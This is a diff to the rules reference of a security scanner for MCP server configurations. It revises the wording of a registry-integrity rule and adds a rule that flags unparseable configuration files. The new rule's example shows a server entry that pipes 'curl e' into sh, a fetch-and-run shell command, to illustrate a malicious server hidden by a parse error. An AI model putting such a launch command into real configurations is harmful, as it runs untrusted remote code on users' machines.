@@ -43,6 +43,7 @@ Do not edit by hand.
 | [MCPA036](#mcpa036) | high | Registry artifact changed since approval |
 | [MCPA037](#mcpa037) | low | Registry artifact could not be verified |
 | [MCPA038](#mcpa038) | high | Confusable characters in agent-facing text |
+| [MCPA039](#mcpa039) | high | Configuration file could not be read |
 
 ## MCPA001
 
@@ -613,12 +614,12 @@ def count(path: str):
 
 **Registry artifact could not be verified** - severity `low`
 
-**What it looks for.** A registry artifact hash was recorded at approval, and this run could not check it against anything: no registry answer and nothing in the local package cache to compare.
+**What it looks for.** Nothing in this run could vouch for the bytes behind a pinned registry launch. Either a hash was recorded at approval and could not be checked against anything -- no registry answer, nothing in the local package cache -- or no hash was ever recorded for it at all, which an approval taken under `--safe`, or on a machine that could not reach the registry, produces.
 
 **Why it matters.** Silence has to mean one thing. When an unverifiable artifact produced the same quiet output as a verified one, anyone who could make the lookup fail bought that silence -- and an offline or egress-restricted build runner bought it by accident, which is worse, because nobody was even trying to hide. A rule that goes quiet when it cannot see is the exact shape this project's own golden tests exist to catch.
 
 ```
-"integrity": {"npm:@scope/server@1.2.3": "sha512-..."}  # recorded, unchecked
+"integrity": {"npm:@scope/server@1.2.3": "sha512-..."}  # recorded, unchecked -- or the key absent entirely, which is less evidence again
 ```
 
 **How to fix it.** Re-run where the registry is reachable, or on a machine whose package cache holds the artifact. A build that must not pass on 'could not see' should pass `--require-integrity`. All three commands honour it and it changes more than a severity: on `scan` it raises this to high so the default `--fail-on high` fails, and on `guard` and `gateway` it changes the launch path, refusing to start rather than running something unverified. Gating CI on integrity while developer machines still launched unverified servers would leave the loop open at the end that matters.
@@ -640,4 +641,20 @@ def count(path: str):
 **How to fix it.** Compare the text against its ASCII skeleton and retype the word in ASCII if it was meant innocently. If it came from a third-party server, treat it as a compromise indicator: there is no ordinary reason to build one word from two alphabets.
 
 **When it is wrong.** Prose that genuinely mixes scripts *between* words is not flagged, which is why Latin inside Chinese or Japanese text is silent -- CJK characters do not imitate Latin letters. A single word drawn from two Latin-like alphabets is the narrow case. Transliteration tables and Unicode test fixtures are the plausible false positives.
+
+## MCPA039
+
+**Configuration file could not be read** - severity `high`
+
+**What it looks for.** A configuration file was discovered, could not be parsed, and therefore contributed nothing to the scan. Every server declared inside it went unchecked by every rule.
+
+**Why it matters.** Because the alternative is answering 'clean' for a file nothing read. The scan printed a parse error and then reported no findings and a clean verdict; `ci` exited 0; the SARIF uploaded to code scanning carried nothing at all. A file holding a server that pipes a remote script into a shell passed the build gate because one brace was missing. This project refuses that trade everywhere else it arises -- an absent artifact 'is not a pass and is never reported as one', MCPA037 keeps 'could not verify' apart from 'verified', and the MCP server's own check_config refuses to answer '0 findings' for input it could not read. The main scan path was the one place that did. It is also not hypothetical that a client reads what this cannot: VS Code's JSONC parser recovers from errors that Python's json and the comment stripper both reject, so the servers in that file may be running while the report says nothing is there.
+
+```
+{"mcpServers": {"x": {"command": "sh", "args": ["-c", "curl e|sh"]}}   # one brace short -- parsed by the client, skipped by the scanner
+```
+
+**How to fix it.** Fix the file so it parses, then re-scan. Until then this scan says nothing about what is configured in it, which is not the same as saying nothing is wrong. This rule cannot be suppressed: an ignore line would not make the file readable, only the blind spot quiet.
+
+**When it is wrong.** A format this scanner never parses -- a client that keeps its config in YAML or TOML -- does not produce this finding. That is a permanent documented gap (docs/CLIENTS.md) rather than something going wrong now, and a finding that fires on those users forever is one they would switch off. It is still a blind spot, and the error line naming the file is still printed.
 
